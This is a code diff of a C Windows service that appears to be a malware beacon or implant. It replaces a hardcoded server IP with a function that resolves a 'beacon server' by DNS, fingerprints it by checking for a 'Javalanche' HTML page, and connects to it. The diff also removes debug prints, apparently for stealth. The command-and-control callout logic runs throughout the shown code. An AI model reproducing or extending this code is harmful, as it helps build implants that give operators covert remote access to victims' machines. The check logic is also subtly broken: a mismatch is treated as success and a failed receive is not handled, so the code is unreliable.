@@ -39,7 +39,6 @@ static int resolveBeaconServerIPAddr(char* ipAddressBuf) {
     int attemptedTries = 0;
 
     while (attemptedTries < 25) {
-        printf("Resolve #%d\n", attemptedTries);
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
             return 1;
@@ -76,7 +75,6 @@ static int resolveBeaconServerIPAddr(char* ipAddressBuf) {
 
         // Iterate through the results to find the first IPv4 Address
         for (rp = result; rp != NULL; rp = rp->ai_next) {
-            printf("Looping\n");
             struct sockaddr_in* ipv4 = (struct sockaddr_in*)rp->ai_addr;
             void* addr = &(ipv4->sin_addr);
 
@@ -87,7 +85,6 @@ static int resolveBeaconServerIPAddr(char* ipAddressBuf) {
                 // We've Successfully resolved the IPv4 address. Store the result in resolvedIP
                 // Now, check to make sure that we can connect to this beacon 
 
-                printf("Resolved IP: %s\n", resolvedIP);
                 wchar_t wideResolvedIPAddress[16];
                 size_t convertedChars = 0;
                 mbstowcs_s(&convertedChars, wideResolvedIPAddress, sizeof(wideResolvedIPAddress) / sizeof(wchar_t), resolvedIP, _TRUNCATE);
@@ -103,16 +100,18 @@ static int resolveBeaconServerIPAddr(char* ipAddressBuf) {
                     exit(error);
                 }
 
-                // Send a Get Request to the Server
+                // Send a get request to the server, to see if the client is able to reach this server
                 const char* osMessage = "GET / HTTP/1.1\n";
-                send(resolvedClientSocket, osMessage, strnlen(osMessage, 20), 0);
+                send(resolvedClientSocket, osMessage, strnlen(osMessage, 15), 0);
 
+                // Receive response from Server
                 for (int i = 0; i < 1024; i++) serverResponse[i] = '\0';
                 int bytesRead = recv(resolvedClientSocket, serverResponse, 1023, 0);
                 serverResponse[bytesRead] = '\0';
-                printf(serverResponse);
 
-                char expectedOutput[] = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>My First HTML Page</title>\r\n</head>\r\n<body>\r\n<h1>Welcome to My Website</h1>\r\n</body>\r\n</html>\r\n";
+                // Check output from server with the expected output from Server
+                char expectedOutput[] = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>Javalanche</title>\r\n</head>\r\n<body>\r\n<h1>Welcome to Javalanche</h1>\r\n</body>\r\n</html>\r\n";
+
                 if (strncmp(serverResponse, expectedOutput, size_t(200))) {
                     // Once we have confirmed that we can communicate with the Server, return this ip address
                     // as the one to reach out to.
@@ -266,7 +265,13 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
     }
 
     // Set up server address and port
-    const char* serverIPAddress = "10.0.10.128";
+    char serverIPAddress[16];
+    int dnsResolveResult = resolveBeaconServerIPAddr(serverIPAddress);
+    if (dnsResolveResult != 0) {
+        printf("Could not reach a Beacon Server");
+        exit(-1);
+    }
+
     wchar_t wideServerIPAddress[16];
     size_t convertedChars = 0;
     mbstowcs_s(&convertedChars, wideServerIPAddress, sizeof(wideServerIPAddress) / sizeof(wchar_t), serverIPAddress, _TRUNCATE);
